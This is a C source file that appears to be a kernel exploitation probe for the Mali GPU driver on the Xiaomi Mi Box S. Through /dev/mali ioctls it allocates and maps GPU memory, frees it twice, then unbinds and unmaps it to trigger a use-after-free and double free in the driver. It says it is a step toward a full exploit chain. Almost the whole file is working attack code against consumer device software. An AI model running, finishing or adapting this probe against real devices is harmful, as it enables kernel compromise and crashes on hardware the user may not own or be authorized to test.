/*
 * b_probe.c - Mi Box S Mali UAF probe (B方案)
 *
 * Test MALI_IOC_MEM_UNBIND refcount UAF on Mi Box S r10p1 driver.
 * Strategy (from frels reference):
 * 1. ALLOC_MEM + mmap -> refcount = 2
 * 2. FREE_MEM -> refcount = 1
 * 3. FREE_MEM again -> refcount = 0, frees underlying memory
 * 4. UNBIND_MEM -> UAF if memory was freed
 * 5. munmap -> triggers second free (double free on driver's freelist)
 *
 * If UAF exists: driver returns success, no panic, memory is freed twice.
 * If UAF doesn't exist: driver returns error or panics.
 *
 * This is just a probe, not the full exploit chain.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>

/* ==================== MALI IOCTL ==================== */

/* Mi Box S uses type=0x83, same as kort_miboxs_1x1.c */
#define MALI_IOC_MEM_ALLOC      0xC0288300u
#define MALI_IOC_MEM_FREE       0xC0108301u
#define MALI_IOC_MEM_UNBIND     0xC0108303u
#define MALI_IOC_MEM_BIND       0xC0288302u

/* ==================== STRUCTURES ==================== */

typedef struct {
    uint64_t ctx;
    uint32_t gpu_vaddr;
    uint32_t vsize;
    uint32_t psize;
    uint32_t flags;
    uint64_t backend_handle;
    int32_t secure_shared_fd;
} mali_uk_alloc_mem_s;

typedef struct {
    uint64_t ctx;
    uint32_t gpu_vaddr;
    uint32_t free_pages_nr;
} mali_uk_free_mem_s;

typedef struct {
    uint64_t ctx;
    uint32_t vaddr;
    uint32_t flags;
} mali_uk_unbind_mem_s;

#define MEM_SIZE  0x1000  /* 1 page */
#define GPU_VA    0x40000000u

/* ==================== GLOBALS ==================== */

static volatile int g_to = 0;
static void alarm_handler(int s) { (void)s; g_to = 1; }

static int fd = -1;

static int tio(unsigned int cmd, void *buf, int timeout) {
    alarm(timeout); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno;
    alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

/* ==================== MAIN ==================== */

int main(int argc, char **argv)
{
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = alarm_handler;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("██   ██  ██████  ██████  ████████\n");
    printf("██  ██  ██    ██ ██   ██    ██   \n");
    printf("█████   ██    ██ ██████     ██   \n");
    printf("██  ██  ██    ██ ██   ██    ██   \n");
    printf("██   ██  ██████  ██   ██    ██   \n");
    printf("\n         Mi Box S Mali UAF Probe (B方案)\n\n");

    /* Open Mali device */
    fd = open("/dev/mali", O_RDWR);
    if (fd < 0) {
        perror("[-] open /dev/mali");
        return 1;
    }
    printf("[+] opened /dev/mali (fd=%d)\n", fd);

    /* [1] ALLOC_MEM */
    printf("\n[1] ALLOC_MEM (%d bytes)\n", MEM_SIZE);
    mali_uk_alloc_mem_s alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.gpu_vaddr = GPU_VA;
    alloc.vsize = MEM_SIZE;
    alloc.psize = MEM_SIZE;
    alloc.flags = 0;
    int rc = tio(MALI_IOC_MEM_ALLOC, &alloc, 3);
    if (rc == -999) { printf("[-] ALLOC TIMEOUT\n"); return 1; }
    if (rc != 0) {
        printf("[-] ALLOC failed: %s (err=%d)\n", strerror(-rc), -rc);
        return 1;
    }
    printf("[+] ALLOC OK ctx=0x%llx gpu_vaddr=0x%08x backend=0x%llx\n",
           (unsigned long long)alloc.ctx,
           alloc.gpu_vaddr,
           (unsigned long long)alloc.backend_handle);

    /* [2] mmap (increases refcount to 2) */
    printf("\n[2] mmap (refcount = 2)\n");
    void *ptr = mmap(NULL, MEM_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, alloc.gpu_vaddr);
    if (ptr == MAP_FAILED) {
        perror("[-] mmap");
        return 1;
    }
    printf("[+] mmap OK (%p)\n", ptr);
    memset(ptr, 0x41, MEM_SIZE);  /* mark with 'A' */

    /* [3] FREE_MEM (refcount -> 1) */
    printf("\n[3] FREE_MEM (refcount -> 1)\n");
    mali_uk_free_mem_s free_mem;
    memset(&free_mem, 0, sizeof(free_mem));
    free_mem.ctx = alloc.ctx;
    free_mem.gpu_vaddr = alloc.gpu_vaddr;
    rc = tio(MALI_IOC_MEM_FREE, &free_mem, 3);
    if (rc == -999) { printf("[-] FREE TIMEOUT\n"); return 1; }
    if (rc != 0) {
        printf("[-] FREE failed: %s (err=%d)\n", strerror(-rc), -rc);
        goto cleanup;
    }
    printf("[+] FREE OK (free_pages_nr=%u)\n", free_mem.free_pages_nr);

    /* [4] FREE_MEM again (refcount -> 0, frees underlying memory) */
    printf("\n[4] FREE_MEM again (refcount -> 0, memory freed)\n");
    free_mem.free_pages_nr = 0;  /* reset output field */
    rc = tio(MALI_IOC_MEM_FREE, &free_mem, 3);
    if (rc == -999) { printf("[-] FREE #2 TIMEOUT\n"); return 1; }
    if (rc != 0) {
        printf("[-] FREE #2 failed: %s (err=%d)\n", strerror(-rc), -rc);
        printf("[*] This is expected if refcount is already 0\n");
    } else {
        printf("[+] FREE #2 OK (free_pages_nr=%u)\n", free_mem.free_pages_nr);
    }

    /* [5] UNBIND_MEM (triggers UAF if memory was freed) */
    printf("\n[5] UNBIND_MEM (check UAF)\n");
    mali_uk_unbind_mem_s unbind;
    memset(&unbind, 0, sizeof(unbind));
    unbind.ctx = alloc.ctx;
    unbind.vaddr = alloc.gpu_vaddr;
    unbind.flags = 0;
    rc = tio(MALI_IOC_MEM_UNBIND, &unbind, 3);
    if (rc == -999) { printf("[-] UNBIND TIMEOUT\n"); return 1; }
    if (rc != 0) {
        printf("[-] UNBIND failed: %s (err=%d)\n", strerror(-rc), -rc);
        printf("[*] UNBIND may not exist on this driver version\n");
    } else {
        printf("[+] UNBIND OK - memory was bound/unbound\n");
    }

    /* [6] munmap (triggers second free on driver's freelist) */
    printf("\n[6] munmap (triggers second free)\n");
    rc = munmap(ptr, MEM_SIZE);
    if (rc != 0) {
        printf("[-] munmap failed: %s\n", strerror(errno));
    } else {
        printf("[+] munmap OK\n");
    }

    /* [7] Check if device is still accessible */
    printf("\n[7] Check device accessibility...\n");
    mali_uk_alloc_mem_s test_alloc;
    memset(&test_alloc, 0, sizeof(test_alloc));
    test_alloc.gpu_vaddr = GPU_VA + 0x1000;
    test_alloc.vsize = MEM_SIZE;
    test_alloc.psize = MEM_SIZE;
    rc = tio(MALI_IOC_MEM_ALLOC, &test_alloc, 3);
    if (rc != 0) {
        printf("[-] ALLOC after munmap failed: %s (err=%d)\n", strerror(-rc), -rc);
        printf("[*] Driver may be hung or crashed\n");
    } else {
        printf("[+] ALLOC after munmap OK - driver still alive\n");
        printf("[*] UAF may exist (memory freed twice without panic)\n");

        /* Free test allocation */
        mali_uk_free_mem_s test_free;
        memset(&test_free, 0, sizeof(test_free));
        test_free.ctx = test_alloc.ctx;
        test_free.gpu_vaddr = test_alloc.gpu_vaddr;
        tio(MALI_IOC_MEM_FREE, &test_free, 3);
    }

cleanup:
    printf("\n[*] Summary:\n");
    printf("  MALI_IOC_MEM_ALLOC  = 0x%08x (type=0x83, nr=0, size=0x28)\n", MALI_IOC_MEM_ALLOC);
    printf("  MALI_IOC_MEM_FREE   = 0x%08x (type=0x83, nr=1, size=0x10)\n", MALI_IOC_MEM_FREE);
    printf("  MALI_IOC_MEM_UNBIND = 0x%08x (type=0x83, nr=3, size=0x10)\n", MALI_IOC_MEM_UNBIND);
    printf("  MEM_SIZE = 0x%x bytes\n", MEM_SIZE);
    printf("\n[*] Next: check if /proc/driver/wmt_dbg or similar trigger exists on Amlogic\n");

    close(fd);
    return 0;
}
